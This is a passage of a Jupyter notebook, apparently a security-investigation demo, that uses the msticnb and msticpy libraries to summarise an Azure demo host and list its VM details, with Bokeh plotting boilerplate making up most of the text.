       "  var render_items = [{\"docid\":\"998cf92c-6729-4ba7-b5a9-315779fa1145\",\"root_ids\":[\"4550\"],\"roots\":{\"4550\":\"e3eac0c0-4263-4fde-8b9b-77148947ba48\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "4550"
      }
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Getting data from Bookmarks...\n"
     ]
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>No bookmarks found.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticnb.common import TimeSpan\n",
    "from datetime import datetime\n",
    "host_name=\"BlackHatDemoHos\"\n",
    "tspan = TimeSpan(start=datetime(2020,7,7,0,0,1), end=datetime(2020,7,8,0,0,1))\n",
    "nblet = nb.nblts.azsent.host.HostSummary()\n",
    "out = nblet.run(value=host_name, timespan=tspan)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### MDATP/Azure Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>resource_id</th>\n",
       "      <th>name</th>\n",
       "      <th>resource_type</th>\n",
       "      <th>location</th>\n",
       "      <th>tags</th>\n",
       "      <th>plan</th>\n",
       "      <th>properties</th>\n",
       "      <th>kind</th>\n",
       "      <th>managed_by</th>\n",
       "      <th>sku</th>\n",
       "      <th>identity</th>\n",
       "      <th>state</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>285</th>\n",
       "      <td>/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Micros...</td>\n",
       "      <td>BlackHatDemoHost</td>\n",
       "      <td>Microsoft.Compute/virtualMachines</td>\n",
       "      <td>eastus</td>\n",
       "      <td>{'Role': 'Demo'}</td>\n",
       "      <td>None</td>\n",
       "      <td>None</td>\n",
       "      <td>None</td>\n",
       "      <td>None</td>\n",
       "      <td>None</td>\n",
       "      <td>None</td>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                                             resource_id  \\\n",
       "285  /subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Micros...   \n",
       "\n",
       "                 name                      resource_type location  \\\n",
       "285  BlackHatDemoHost  Microsoft.Compute/virtualMachines   eastus   \n",
       "\n",
       "                 tags  plan properties  kind managed_by   sku identity state  \n",
       "285  {'Role': 'Demo'}  None       None  None       None  None     None  None  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "#Register AAD apps for this\n",
    "from msticpy.data.azure_data import AzureData\n",
    "az = AzureData()\n",
    "az.connect()\n",
    "sub_id = az.get_subscriptions().iloc[0]['Subscription ID']\n",
    "resources = az.get_resources(sub_id)\n",
    "display(resources[resources['name'] == \"BlackHatDemoHost\"])\n",
    "res_id = resources[resources['name'] == \"BlackHatDemoHost\"].iloc[0]['resource_id']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'resource_id': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Microsoft.Compute/virtualMachines/BlackHatDemoHost',\n",
       " 'name': 'BlackHatDemoHost',\n",
       " 'resource_type': 'Microsoft.Compute/virtualMachines',\n",
       " 'location': 'eastus',\n",
       " 'tags': {'Role': 'Demo'},\n",
       " 'plan': None,\n",
       " 'properties': {'vmId': '3f2b6a14-4c02-41aa-a2e8-6859ee4c7847',\n",
       "  'hardwareProfile': {'vmSize': 'Standard_B2s'},\n",
       "  'storageProfile': {'imageReference': {'publisher': 'MicrosoftWindowsDesktop',\n",
       "    'offer': 'Windows-10',\n",
       "    'sku': 'rs5-pro',\n",
       "    'version': 'latest',\n",
       "    'exactVersion': '17763.1282.2006061952'},\n",
       "   'osDisk': {'osType': 'Windows',\n",
       "    'name': 'BlackHatDemoHost_OsDisk_1_dd1ef27d863e4e14ab3b446a4ab3ab20',\n",
       "    'createOption': 'FromImage',\n",
       "    'caching': 'ReadWrite',\n",
       "    'managedDisk': {'id': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BLACKHATDEMO/providers/Microsoft.Compute/disks/BlackHatDemoHost_OsDisk_1_dd1ef27d863e4e14ab3b446a4ab3ab20'}},\n",
       "   'dataDisks': []},\n",
       "  'osProfile': {'computerName': 'BlackHatDemoHos',\n",
       "   'adminUsername': 'mstic_admin',\n",
       "   'windowsConfiguration': {'provisionVMAgent': True,\n",
       "    'enableAutomaticUpdates': True,\n",
       "    'patchSettings': {'patchMode': 'AutomaticByOS'}},\n",
       "   'secrets': [],\n",
       "   'allowExtensionOperations': True,\n",
       "   'requireGuestProvisionSignal': True},\n",
       "  'networkProfile': {'networkInterfaces': [{'id': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Microsoft.Network/networkInterfaces/blackhatdemohost86'}]},\n",
       "  'licenseType': 'Windows_Client',\n",
       "  'provisioningState': 'Succeeded'},\n",
       " 'kind': None,\n",
       " 'managed_by': None,\n",
       " 'sku': None,\n",
       " 'identity': None,\n",
       " 'state': <azure.mgmt.compute.v2019_12_01.models._models_py3.VirtualMachineInstanceView at 0x1e533890f10>}"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "az.get_resource_details(resource_id=res_id, sub_id=sub_id)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"4791\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"4791\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error() {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (var i = 0; i < css_urls.length; i++) {\n",
       "      var url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n",
       "\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      var element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      if (url in hashes) {\n",
       "        element.crossOrigin = \"anonymous\";\n",
       "        element.integrity = \"sha384-\" + hashes[url];\n",
       "      }\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n",
       "  var css_urls = [];\n",
       "  \n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (var i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"4791\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"4791\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error() {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (var i = 0; i < css_urls.length; i++) {\n      var url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      var element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.async = false;\n      element.src = url;\n      if (url in hashes) {\n        element.crossOrigin = \"anonymous\";\n        element.integrity = \"sha384-\" + hashes[url];\n      }\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n  var css_urls = [];\n  \n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (var i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"4791\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"a35756ef-b8cf-4596-b999-6aa78627ae18\" data-root-id=\"4793\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"1597ac1a-e229-415a-81b9-7944af9b94e4\":{\"roots\":{\"references\":[{\"attributes\":{\"below\":[{\"id\":\"4804\"}],\"center\":[{\"id\":\"4807\"},{\"id\":\"4811\"}],\"left\":[{\"id\":\"4808\"}],\"min_border_left\":50,\"plot_height\":400,\"plot_width\":900,\"renderers\":[{\"id\":\"4831\"}],\"title\":{\"id\":\"4794\"},\"toolbar\":{\"id\":\"4818\"},\"toolbar_location\":\"above\",\"x_range\":{\"id\":\"4796\"},\"x_scale\":{\"id\":\"4800\"},\"y_range\":{\"id\":\"4798\"},\"y_scale\":{\"id\":\"4802\"}},\"id\":\"4793\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"4847\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"4841\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{},\"id\":\"4809\",\"type\":\"BasicTicker\"},{\"attributes\":{\"line_alpha\":0.7,\"line_color\":\"navy\",\"line_width\":2,\"x\":{\"field\":\"Time\"},\"y\":{\"field\":\"Data\"}},\"id\":\"4829\",\"type\":\"Line\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"4840\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{},\"id\":\"4834\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"axis_label\":\"Event Time\",\"formatter\":{\"id\":\"4825\"},\"ticker\":{\"id\":\"4805\"}},\"id\":\"4804\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"4840\"},{\"id\":\"4841\"},{\"id\":\"4842\"},{\"id\":\"4843\"},{\"id\":\"4844\"},{\"id\":\"4845\"},{\"id\":\"4846\"},{\"id\":\"4847\"},{\"id\":\"4848\"},{\"id\":\"4849\"},{\"id\":\"4850\"},{\"id\":\"4851\"}]},\"id\":\"4805\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"4846\",\"type\":\"DaysTicker\"},{\"attributes\":{\"axis\":{\"id\":\"4804\"},\"grid_line_alpha\":0.3,\"grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.1,\"minor_grid_line_color\":\"navy\",\"ticker\":null},\"id\":\"4807\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"4800\",\"type\":\"LinearScale\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"4843\",\"type\":\"DaysTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"4845\",\"type\":\"DaysTicker\"},{\"attributes\":{\"data\":{\"Data\":{\"__ndarray__\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA